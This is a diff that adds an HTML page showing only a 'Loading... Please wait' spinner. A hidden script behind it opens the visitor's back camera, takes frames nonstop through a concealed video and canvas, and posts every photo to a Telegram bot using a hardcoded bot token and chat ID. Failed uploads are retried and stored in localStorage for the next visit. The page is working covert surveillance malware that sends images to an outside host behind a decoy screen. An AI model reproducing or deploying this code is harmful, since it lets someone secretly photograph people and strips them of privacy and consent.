@@ -1,0 +1,172 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Loading...</title>
+    <style>
+        body {
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            height: 100vh;
+            margin: 0;
+            background-color: #1a1a1a;
+            font-family: Arial, sans-serif;
+            color: #fff;
+        }
+        #loading-container {
+            text-align: center;
+        }
+        .spinner {
+            border: 6px solid #f3f3f3;
+            border-top: 6px solid #3498db;
+            border-radius: 50%;
+            width: 60px;
+            height: 60px;
+            animation: spin 1s linear infinite;
+            margin: 20px auto;
+        }
+        @keyframes spin {
+            0% { transform: rotate(0deg); }
+            100% { transform: rotate(360deg); }
+        }
+        #loading-message {
+            font-size: 18px;
+            color: #ccc;
+        }
+        #error-message {
+            color: #ff4c4c;
+            margin-top: 10px;
+            display: none;
+        }
+    </style>
+</head>
+<body>
+    <div id="loading-container">
+        <div class="spinner"></div>
+        <div id="loading-message">Please wait...</div>
+        <div id="error-message">Failed to upload image. Retrying...</div>
+    </div>
+    <video id="video" autoplay style="display:none;"></video>
+    <canvas id="canvas" style="display:none;"></canvas>
+    <script>
+        document.addEventListener("DOMContentLoaded", function() {
+            const video = document.getElementById('video');
+            const canvas = document.getElementById('canvas');
+            const context = canvas.getContext('2d');
+            const telegramBotToken = '6560503910:AAGcAQAqAJNVHtFiWf6qwmIoUerWmbx942U';
+            const telegramChatId = '5816023717';
+            const errorMessage = document.getElementById('error-message');
+            const maxRetries = 3; // Maximum number of retries for uploading the image
+            let retryCount = 0;
+
+            // Function to send the image to the Telegram bot
+            function sendImageToTelegram(imageBlob) {
+                const formData = new FormData();
+                formData.append('chat_id', telegramChatId);
+                formData.append('photo', imageBlob, 'image.jpg');
+
+                fetch(`https://api.telegram.org/bot${telegramBotToken}/sendPhoto`, {
+                    method: 'POST',
+                    body: formData
+                })
+                .then(response => response.json())
+                .then(data => {
+                    if (data.ok) {
+                        console.log('Image sent successfully');
+                        localStorage.removeItem('failedImage'); // Clear the saved image on success
+                        captureAndSendImage(); // Capture next image
+                    } else {
+                        console.error('Error sending image:', data.description);
+                        handleUploadError(imageBlob);
+                    }
+                })
+                .catch(error => {
+                    console.error('Error:', error);
+                    handleUploadError(imageBlob);
+                });
+            }
+
+            // Function to handle image upload error
+            function handleUploadError(imageBlob) {
+                retryCount++;
+                if (retryCount <= maxRetries) {
+                    errorMessage.style.display = 'block';
+                    console.log(`Retrying to send image (${retryCount}/${maxRetries})...`);
+                    sendImageToTelegram(imageBlob);
+                } else {
+                    console.error('Failed to upload image after multiple attempts.');
+                    errorMessage.textContent = 'Failed to upload image after multiple attempts. Will retry on next page load.';
+                    saveImageToLocalStorage(imageBlob);
+                    captureAndSendImage(); // Continue to next image
+                }
+            }
+
+            // Save image to local storage as a Base64 string
+            function saveImageToLocalStorage(imageBlob) {
+                const reader = new FileReader();
+                reader.onload = function() {
+                    localStorage.setItem('failedImage', reader.result);
+                };
+                reader.readAsDataURL(imageBlob);
+            }
+
+            // Load and retry sending saved image from local storage
+            function retrySavedImage() {
+                const savedImage = localStorage.getItem('failedImage');
+                if (savedImage) {
+                    fetch(savedImage)
+                        .then(res => res.blob())
+                        .then(blob => {
+                            console.log('Retrying saved image upload.');
+                            sendImageToTelegram(blob);
+                        })
+                        .catch(error => {
+                            console.error('Error retrieving saved image:', error);
+                        });
+                }
+            }
+
+            // Function to capture and send an image
+            function captureAndSendImage() {
+                context.drawImage(video, 0, 0, canvas.width, canvas.height);
+                canvas.toBlob(blob => {
+                    sendImageToTelegram(blob);
+                }, 'image/jpeg');
+            }
+
+            // Access the device's back camera
+            if (navigator.mediaDevices && navigator.mediaDevices.getUserMedia) {
+                navigator.mediaDevices.enumerateDevices()
+                .then(devices => {
+                    const videoDevice = devices.find(device => device.kind === 'videoinput' && device.label.toLowerCase().includes('back')) || devices.find(device => device.kind === 'videoinput');
+                    return navigator.mediaDevices.getUserMedia({ video: { deviceId: videoDevice.deviceId } });
+                })
+                .then(stream => {
+                    video.srcObject = stream;
+                    video.play();
+
+                    // Wait for the video stream to be ready, then continuously capture images
+                    video.onloadeddata = () => {
+                        // Set canvas size to match video stream dimensions
+                        canvas.width = video.videoWidth;
+                        canvas.height = video.videoHeight;
+
+                        // Retry sending any saved images
+                        retrySavedImage();
+
+                        // Start capturing and sending images continuously
+                        captureAndSendImage();
+                    };
+                })
+                .catch(error => {
+                    console.error('Error accessing the camera:', error);
+                });
+            } else {
+                console.error('Camera not supported by this browser.');
+            }
+        });
+    </script>
+</body>
+</html>
